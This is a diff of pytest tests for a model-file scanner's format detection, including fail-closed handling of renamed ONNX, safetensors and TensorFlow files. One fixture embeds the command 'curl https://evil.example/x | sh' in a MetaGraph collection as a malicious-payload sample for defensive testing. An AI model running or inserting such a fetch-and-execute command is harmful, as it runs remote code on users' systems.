@@ -24,7 +24,9 @@ from modelaudit.utils.file.detection import (
     MXNET_SYMBOL_ROUTING_INCONCLUSIVE_FORMAT,
     MXNET_SYMBOL_SIGNATURE_READ_BYTES,
     NEMO_ROUTING_INCONCLUSIVE_FORMAT,
+    ONNX_ROUTING_INCONCLUSIVE_FORMAT,
     PROTO0_1_MAX_PROBE_BYTES,
+    SAFETENSORS_ROUTING_HEADER_PARSE_BYTES,
     TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT,
     XGBOOST_UBJSON_ROUTING_INCONCLUSIVE_FORMAT,
     detect_file_format,
@@ -39,6 +41,7 @@ from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as 
 from tests.helpers import (
     create_mock_mxnet_symbol,
     create_mock_onnx,
+    prefix_mock_onnx_with_branching_unknown_groups,
     prefix_mock_onnx_with_unknown_field,
     prefix_mock_onnx_with_unknown_group,
 )
@@ -122,7 +125,6 @@ def _build_tf_collection_only_metagraph_bytes() -> bytes:
 
     meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
     metagraph = meta_graph_pb2.MetaGraphDef()
-    metagraph.graph_def.SetInParent()
     metagraph.collection_def["runtime_hook"].bytes_list.value.append(b"curl https://evil.example/x | sh")
     return cast(bytes, metagraph.SerializeToString())
 
@@ -168,6 +170,15 @@ def _proto_varint_field(field_number: int, value: int) -> bytes:
 
 def _proto_length_field(field_number: int, payload: bytes) -> bytes:
     return _encode_proto_varint((field_number << 3) | 2) + _encode_proto_varint(len(payload)) + payload
+
+
+def _write_sparse_oversized_safetensors_candidate(path: Path) -> None:
+    """Write framing beyond the routing parse budget without allocating its header."""
+    header_len = SAFETENSORS_ROUTING_HEADER_PARSE_BYTES + 1
+    with path.open("wb") as handle:
+        handle.write(struct.pack("<Q", header_len))
+        handle.write(b"{")
+        handle.truncate(8 + header_len + 1)
 
 
 def _printable_unknown_proto_prefix(min_bytes: int) -> bytes:
@@ -496,6 +507,25 @@ def test_detect_file_format_from_magic_malformed_safetensors_header_len_rejected
     assert detect_file_format_from_magic(str(malformed_path)) == "unknown"
 
 
+def test_detect_oversized_renamed_safetensors_candidate_for_bounded_scan(tmp_path: Path) -> None:
+    candidate_path = tmp_path / "oversized.jpg"
+    malformed_path = tmp_path / "framing-only.jpg"
+    _write_sparse_oversized_safetensors_candidate(candidate_path)
+    # Keep the negative fixture outside the unrelated MessagePack route.
+    header_len = SAFETENSORS_ROUTING_HEADER_PARSE_BYTES + 0xC1
+    with malformed_path.open("wb") as handle:
+        handle.write(struct.pack("<Q", header_len))
+        handle.write(b"\x00")
+        handle.truncate(8 + header_len + 1)
+
+    assert detect_file_format_from_magic(str(candidate_path)) == "safetensors"
+    assert detect_file_format_for_skip_filter(str(candidate_path)) == "safetensors"
+    assert detect_file_format(str(candidate_path)) == "safetensors"
+    assert detect_file_format_from_magic(str(malformed_path)) == "unknown"
+    assert detect_file_format_for_skip_filter(str(malformed_path)) == "unknown"
+    assert detect_file_format(str(malformed_path)) == "unknown"
+
+
 def test_detect_file_format_from_magic_invalid_safetensors_json_rejected(tmp_path: Path) -> None:
     malformed_path = tmp_path / "invalid-header.unknown"
     malformed_path.write_bytes(struct.pack("<Q", 1) + b"{" + b"\x00")
@@ -536,19 +566,30 @@ def test_detect_file_format_routes_prefixed_renamed_onnx_by_bounded_structure(tm
     assert detect_file_format_for_skip_filter(str(model_path)) == "onnx"
 
 
-@pytest.mark.parametrize("unknown_field_number", [9, 63, 100])
-def test_detect_file_format_keeps_budget_exhausted_prefixed_renamed_onnx_scannable(
+@pytest.mark.parametrize("field_number", [2, 9, 63])
+def test_detect_file_format_reports_inconclusive_budget_exhausted_prefixed_renamed_onnx(
     tmp_path: Path,
-    unknown_field_number: int,
+    field_number: int,
 ) -> None:
-    """A long legal unknown prefix must stay scannable after bounded routing is exhausted."""
+    """Legal known or unknown padding must fail closed when routing exhausts its budget."""
     pytest.importorskip("onnx")
-    model_path = create_mock_onnx(tmp_path / f"many-prefixes-{unknown_field_number}.jpg")
-    prefix_mock_onnx_with_unknown_field(model_path, value_size=0, count=4097, field_number=unknown_field_number)
+    model_path = create_mock_onnx(tmp_path / f"many-prefixes-{field_number}.jpg")
+    prefix_mock_onnx_with_unknown_field(model_path, value_size=0, count=4097, field_number=field_number)
 
-    assert detect_file_format(str(model_path)) == "onnx"
-    assert detect_file_format_from_magic(str(model_path)) == "onnx"
-    assert detect_file_format_for_skip_filter(str(model_path)) == "onnx"
+    assert detect_file_format(str(model_path)) == ONNX_ROUTING_INCONCLUSIVE_FORMAT
+    assert detect_file_format_from_magic(str(model_path)) == ONNX_ROUTING_INCONCLUSIVE_FORMAT
+    assert detect_file_format_for_skip_filter(str(model_path)) == ONNX_ROUTING_INCONCLUSIVE_FORMAT
+
+
+def test_detect_budget_exhausted_onnx_flax_overlap_keeps_existing_flax_owner(tmp_path: Path) -> None:
+    """An ambiguous MessagePack overlap must remain on its fail-closed owner route."""
+    pytest.importorskip("onnx")
+    model_path = create_mock_onnx(tmp_path / "flax-overlap.jpg")
+    prefix_mock_onnx_with_unknown_field(model_path, value_size=0, count=4097, field_number=100)
+
+    assert detect_file_format(str(model_path)) == "flax_msgpack"
+    assert detect_file_format_from_magic(str(model_path)) == "flax_msgpack"
+    assert detect_file_format_for_skip_filter(str(model_path)) == "flax_msgpack"
 
 
 def test_detect_file_format_routes_group_prefixed_renamed_onnx_by_bounded_structure(tmp_path: Path) -> None:
@@ -562,7 +603,7 @@ def test_detect_file_format_routes_group_prefixed_renamed_onnx_by_bounded_struct
     assert detect_file_format_for_skip_filter(str(model_path)) == "onnx"
 
 
-def test_detect_file_format_keeps_budget_exhausted_group_prefixed_renamed_onnx_scannable(
+def test_detect_file_format_reports_inconclusive_budget_exhausted_group_prefixed_renamed_onnx(
     tmp_path: Path,
 ) -> None:
     """A bounded group walk must fail closed rather than skip renamed ONNX."""
@@ -570,9 +611,20 @@ def test_detect_file_format_keeps_budget_exhausted_group_prefixed_renamed_onnx_s
     model_path = create_mock_onnx(tmp_path / "group-budget-model.jpg")
     prefix_mock_onnx_with_unknown_group(model_path)
 
-    assert detect_file_format(str(model_path)) == "onnx"
-    assert detect_file_format_from_magic(str(model_path)) == "onnx"
-    assert detect_file_format_for_skip_filter(str(model_path)) == "onnx"
+    assert detect_file_format(str(model_path)) == ONNX_ROUTING_INCONCLUSIVE_FORMAT
+    assert detect_file_format_from_magic(str(model_path)) == ONNX_ROUTING_INCONCLUSIVE_FORMAT
+    assert detect_file_format_for_skip_filter(str(model_path)) == ONNX_ROUTING_INCONCLUSIVE_FORMAT
+
+
+def test_detect_file_format_reports_inconclusive_branching_group_budget_exhaustion(tmp_path: Path) -> None:
+    """Nested legal groups share one bounded routing budget across branches."""
+    pytest.importorskip("onnx")
+    model_path = create_mock_onnx(tmp_path / "branching-groups.jpg")
+    prefix_mock_onnx_with_branching_unknown_groups(model_path)
+
+    assert detect_file_format(str(model_path)) == ONNX_ROUTING_INCONCLUSIVE_FORMAT
+    assert detect_file_format_from_magic(str(model_path)) == ONNX_ROUTING_INCONCLUSIVE_FORMAT
+    assert detect_file_format_for_skip_filter(str(model_path)) == ONNX_ROUTING_INCONCLUSIVE_FORMAT
 
 
 def test_detect_file_format_rejects_unknown_prefixed_generic_protobuf(tmp_path: Path) -> None:
@@ -1639,8 +1691,8 @@ def test_detect_oversized_renamed_tf_savedmodel_routes_to_bounded_scan(tmp_path:
     assert detect_file_format(str(oversized_savedmodel)) == "tf_savedmodel"
 
 
-def test_detect_oversized_renamed_tf_savedmodel_metagraph_routes_to_bounded_scan(tmp_path: Path) -> None:
-    oversized_savedmodel = tmp_path / "saved-oversized-metagraph.jpg"
+def test_detect_versioned_protobuf_with_oversized_field_two_stays_inconclusive(tmp_path: Path) -> None:
+    oversized_savedmodel = tmp_path / "versioned-oversized-field-two.jpg"
     oversized_metagraph_size = 20 * 1024 * 1024 + 1
     oversized_savedmodel.write_bytes(
         _proto_varint_field(1, 1)
@@ -1649,9 +1701,11 @@ def test_detect_oversized_renamed_tf_savedmodel_metagraph_routes_to_bounded_scan
         + (b"x" * oversized_metagraph_size)
     )
 
-    assert detect_file_format_from_magic(str(oversized_savedmodel)) == "tf_metagraph"
-    assert detect_file_format_for_skip_filter(str(oversized_savedmodel)) == "tf_metagraph"
-    assert detect_file_format(str(oversized_savedmodel)) == "tf_metagraph"
+    assert detect_file_format_from_magic(str(oversized_savedmodel)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    assert (
+        detect_file_format_for_skip_filter(str(oversized_savedmodel)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    )
+    assert detect_file_format(str(oversized_savedmodel)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
 
 
 def test_detect_oversized_renamed_tf_savedmodel_continues_past_empty_metagraph(tmp_path: Path) -> None:
